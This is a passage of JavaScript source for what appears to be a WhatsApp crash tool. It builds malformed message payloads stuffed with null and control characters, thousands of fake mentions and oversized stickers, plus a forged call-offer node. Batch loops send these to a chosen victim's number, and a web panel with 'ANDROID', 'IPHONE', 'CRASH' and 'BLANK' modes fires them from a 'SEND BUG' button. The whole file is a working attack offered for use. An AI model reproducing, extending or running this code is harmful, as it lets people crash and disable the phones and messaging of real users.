            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: XUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = XUser === ownPnUser || XUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await zebuild.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await zebuild.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: X,
            id: zebuild.generateMessageTag(),
            from: zebuild.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": zebuild.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(zebuild.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    
    await zebuild.sendNode(callNode);
}
async function Bulldozer(sock, X) {
try {
const permen = "\u2063".repeat(4000);
const candy = "\u300B".repeat(3000);

const msg1 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "ini apin tauk",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + candy }  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  

const msg2 = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  

const msg3 = {  
  viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "polisi coli",  
            text: permen  
          }  
        },  
        extendedTextMessage: {  
          text: "{".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000) + candy },  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000) + candy }  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  

const msg4 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "ini apin laa",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  

const msg5 = {  
  requestPhoneNumberMessage: {  
    contextInfo: {  
      businessMessageForwardInfo: {  
        businessOwnerJid: "13135550002@s.whatsapp.net"  
      },  
      bimid: "apa an bego" + "p" + Math.floor(Math.random() * 99999),  
      forwardingScore: 100,  
      isForwarded: true,  
      forwardedNewsletterMessageInfo: {  
        newsletterJid: "120363321780349272@newsletter",  
        serverMessageId: 1,  
        newsletterName: "bim".repeat(1)  
      }  
    }  
  }  
};  

const msg6 = {  
  videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  

const msg7 = [  
  {  
    ID: "68917910",  
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",  
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",  
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",  
  },  
  {  
    ID: "68884987",  
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",  
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",  
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",  
  }
]

for (const msg of [msg4, msg5, msg6]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [X],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: X } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of [msg1, msg2, msg3]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [X],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: X } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of msg7) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [X],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: X } }]  
          }  
        ]  
      }  
    ]  
  });  
}

console.log(` Attacked Sending Bug To ${target} suksesfull`);

} catch (e) {
console.error(e);
}
}

// ====== TEMPAT PEMANGGILAN FUNC & COMBO =====\\
async function androcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
         callWithNode(XNumber),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Android
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Ipongcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
         Vcs(X),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Iphone 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function crashdevice(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 50) {
        await Promise.all([
        Bulldozer(sock, X),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Crash
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Blankdevice(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
         callWithNode(XNumber),
         Vcs(X),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Blank
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>varse-app</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --bg: #0a0f1a;
      --muted: #9aa4c7;
      --text: #e8ecff;
      --primary: #ff0000;
      --secondary: #ff0000;
    }

    * {box-sizing:border-box;margin:0;padding:0;}

    body {
      font-family: Poppins, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: var(--bg);
      overflow: hidden;
      padding: 20px;
      position: relative;
    }

    /* === BACKGROUND VIDEO === */
    video#bgVideo {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -1;
      background: #000;
      /* Paksa auto-load cepat */
      preload: auto;
    }

    .card {
      background: rgba(255, 255, 255, 0.02); /* Sangat transparan */
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 18px;
      padding: 22px 20px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
      animation: fadeIn 0.8s ease;
      z-index: 10;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(10px);}
      to {opacity: 1; transform: translateY(0);}
    }

    .logo {
      width: 100%;
      height: 120px;
      object-fit: cover;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
      margin-bottom: 14px;
    }

    .title {
      font-size: 22px;
      font-family: Orbitron, sans-serif;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 4px;
      text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
    }

    .subtitle {
      font-size: 12px;
      color: var(--muted);
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.15);
      background: rgba(7, 10, 20, 0.6);
      color: var(--text);
      font-size: 13px;
      outline: none;
      text-align: center;
      margin-bottom: 16px;
      transition: 0.3s;
    }

    input:focus {
      border-color: var(--secondary);
      box-shadow: 0 0 6px var(--secondary);
    }

    .buttons-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-bottom: 16px;
    }

    .buttons-grid button {
      padding: 12px;
      font-size: 13px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      background: rgba(255, 255, 255, 0.05);
      color: var(--text);
      border: 1px solid rgba(255, 255, 255, 0.15);
      transition: all 0.3s ease;
    }

    .buttons-grid button:hover {
      box-shadow: 0 0 12px var(--secondary);
      transform: translateY(-2px) scale(1.03);
    }

    .buttons-grid button.selected {
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      color: white;
      box-shadow: 0 0 12px var(--primary);
    }

    .execute-button {
      width: 100%;
      padding: 12px;
      font-size: 14px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      color: white;
      margin-bottom: 12px;
      box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
      transition: all 0.3s ease;
    }

    .execute-button:hover:not(:disabled) {
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.6);
    }

    .execute-button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .footer-action-container {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }

    .footer-button {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease;
    }

    .footer-button:hover {
      background: rgba(255, 0, 0, 0.2);
    }

    .footer-button a {
      text-decoration: none;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: #111;
      color: var(--secondary);
      padding: 16px 22px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
      font-weight: bold;
      display: none;
      z-index: 9999;
      text-align: center;
    }
  </style>
</head>
<body>

  <!-- Background Video -->
  <video id="bgVideo" autoplay muted loop playsinline>
    <source src="https://files.catbox.moe/7kllma.mp4" type="video/mp4">
  </video>

  <div class="card">
    <img src="profile.jpg" class="logo" alt="Logo">
    <div class="subtitle">version 5.0</div>

    <input type="text" placeholder="contoh : 62xxx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="android"><i class="fas fa-skull-crossbones"></i> ANDROID</button>
      <button class="mode-btn" data-mode="ios"><i class="fas fa-fire"></i> IPHONE</button>
      <button class="mode-btn" data-mode="crash"><i class="fas fa-fire"></i> CRASH</button>
      <button class="mode-btn" data-mode="blank"><i class="fas fa-skull-crossbones"></i> BLANK</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> SEND BUG</button>

    <div class="footer-action-container">
      <div class="footer-button">
        <a href="https://t.me/OnVerss3" target="_blank"><i class="fab fa-telegram"></i>Developer</a>
      </div>
      <div class="footer-button">
        <a href="/logout"><i class="fas fa-sign-out-alt"></i>Logout</a>
      </div>
    </div>
  </div>

  <div id="popup" class="popup">Successfull ☑️</div>

  <script>
    const video = document.getElementById("bgVideo");

    // Pastikan autoplay berjalan di semua browser
    document.addEventListener("DOMContentLoaded", () => {
      video.play().catch(() => {
        video.muted = true;
        video.play();
      });
    });

    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');
    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10–15 digit.");
        return;
      }
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 2000);
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};